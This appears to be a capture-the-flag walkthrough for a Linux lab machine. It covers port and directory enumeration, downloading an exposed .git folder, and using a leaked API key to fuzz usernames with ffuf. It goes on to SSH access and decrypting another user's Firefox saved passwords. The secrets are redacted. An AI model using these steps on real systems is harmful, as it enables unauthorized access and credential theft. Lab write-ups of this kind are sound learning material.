# Initial Enumeration
## NMAP Top 1000
```
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDELanAivcbXHH+RqBWDQUmT0TJPTzxJ4XOLkZ4hQYAYCUXQ25C24k6ijW6MnKiImF9m9CoMdlzXIAC/DYArGJu+q5L68V1SAaqtS5YljXGb517Qi4ixekjaLua9Z+Du00c0nGWC46WA+JCjI6UP8FlTyNONXJ4Wv8T7ZA6T8rTrWZWd6dSTIKaZaN8fsD31cIJMuX2whX8IczzwzFuxp2ucPLJ0IwpoiX3ubuqUz4kkNi8FI5T2hweqqygLPmdA8AySZrIbmC4AusmmHwSf99aUHXjZ5Z6fHbHAwH0dsGDFaDvHuVFEp4l1h9TpZiKghUllDx9+6eRyKprJMpfvXZ1
|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPxb2LHHqkJNa+RUETb+7kg2rLKG3IxkiOZnG3YP7R5hd2KqQC1eJL1UyHcBKdOYrFllM43rkqfDVSxtm2f/ivc=
|   256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPwYIfNblUpR0Hf/77s33mZq1OUXZD4jQacBQBwiLapr
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
8081/tcp open  http    syn-ack Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


## Fuff Results For Port 80
```
old                     [Status: 301, Size: 310, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 200, Size: 15, Words: 1, Lines: 4]
:: Progress: [30000/30000] :: Job [1/1] :: 996 req/sec :: Duration: [0:00:29] :: Errors: 2 ::
```

## FUFF Results For Port 8081
```
login                   [Status: 200, Size: 1555, Words: 65, Lines: 43]
api                     [Status: 200, Size: 18, Words: 3, Lines: 1]
forgot                  [Status: 200, Size: 1279, Words: 196, Lines: 28]
```



## Interesting Finds
- `.git` is found within `/old` directory on port 80
Pulling .git with 
`wget -r http://<IP>/old/.git`

We find by running `git log -p` some interesting information regarding the Flask web app.

```
if(data['key']=='<REDACTED>'):
return '{"username":"admin","password":"password"}'
```



## Moving Forward
We can use that on the API that is disclosed from `git log -p` (`/api/<uname>`) to fuzz for an active user using the key found. 

`ffuf -u http://<IP>:8081/api/FUZZ -w /opt/SecLists/Usernames/xato-net-10-million-usernames.txt:FUZZ -fs 16 -d '{"key":"<REDACTED>"}'
`

This returns the following user
`tommy`

by doing a POST request to the tommy endpoint `/api/tommy` we gain the password.

## Users
- tommy: `{"username":"tommy","password":"<REDACTED>"}`
- someone: `{"username":"user1","password":"<REDACTED>"}`


## Foothold
Once you obtain the users from the API. You can ssh in. 


# Authenticated Enumeration
## Users on Box
```
tommyV
carlJ
```


## Interesting Findings
User TommyV has read access on carlJ's home directory.

In this we can see .mozilla

Extracting the firefox directory from .mozilla, we can run firefox_decrypt.py
This prompts us for a password, in which we can spray with `<REDACTED>` to gain credentials:
```
Website:   https://incognito.com
Username: 'dev'
Password: '<REDACTED>'
```


## Privesc
ret2libc haha have fun. ez root 

praise be to M_Alpha and Rootedshell